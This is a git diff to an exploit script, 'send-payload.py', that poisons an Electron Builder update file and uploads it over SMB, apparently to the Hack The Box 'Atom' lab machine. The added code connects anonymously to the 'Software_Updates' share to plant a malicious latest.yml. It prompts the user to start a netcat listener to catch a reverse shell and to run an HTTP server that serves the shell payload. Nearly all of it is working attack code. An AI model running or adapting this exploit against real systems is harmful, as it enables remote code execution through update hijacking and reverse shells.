@@ -6,6 +6,7 @@ import os
 from pathlib import Path
 import hashlib
 import base64
+from smb.SMBConnection import SMBConnection
 
 def get_ip(interface):
     """find your IP on a given interface"""
@@ -104,11 +105,44 @@ def gen_yaml(ip, payload, size, sum, dir):
     
     print(yml_string)
 
-    with open(dir + "/latest.yml", 'a') as f:
+    yml_path = dir + "/latest.yml"
+
+    with open(yml_path, 'a') as f:
         f.write(yml_string)
         f.close()
 
-    print("YAML saved at " + dir + "/latest.yml")
+    print("YAML saved at " + yml_path)
+
+    return yml_path
+
+def smb_upload(yml_path):
+
+    print("\n=== Uploading to SMB ===\n")
+
+    #set client details
+    userID = "whoever"
+    password = ""
+    client_machine_name = "client"
+
+    #set server details
+    server_name = "ATOM" #netbios name
+    server_ip = "10.10.10.237"
+    domain_name = "atom.htb"
+
+    #create and open connection
+    conn = SMBConnection(userID, password, client_machine_name, server_name, domain=domain_name, use_ntlm_v2=True,
+                     is_direct_tcp=True)
+
+    conn.connect(server_ip, 445)
+
+    #upload yml file
+    with open(yml_path, 'rb') as file:
+        # conn.storeFile('client1', 'latest.yml', file)
+        resp = conn.storeFile('Software_Updates', 'client1/latest.yml', file)
+
+    print(str(resp))
+
+    conn.close()
 
 def main():
     parser = argparse.ArgumentParser(prog="send-payload.py", description="Sends a payload to a vulnerable Electron Builder instance over SMB. If no port is provided, listens on port 9001 by default. No default option for IP address is specified.")
@@ -155,10 +189,17 @@ def main():
         if not dirpath.is_dir():
             print("Directory not found - creating directory")
             dirpath.mkdir()
+
+    # remind user to start a listener
+    # in future, start python server in a thread
+    print("Make sure to start required listeners before continuing.\nRun a netcat listener to catch your shell: nc -lnvp {port}\nRun a Python Server to serve your shell in {dir}: sudo python3 -m http.server 80".format(port=port, dir=path))
+    input("Press enter to continue once you've started your listeners...\n")
     
     payload_name, size, sum = get_payload(args, ip, port, path)
 
-    gen_yaml(ip, payload_name, size, sum, arg_path)
+    yml_path = gen_yaml(ip, payload_name, size, sum, arg_path)
+
+    smb_upload(yml_path)
 
 if __name__ == '__main__':
     main()
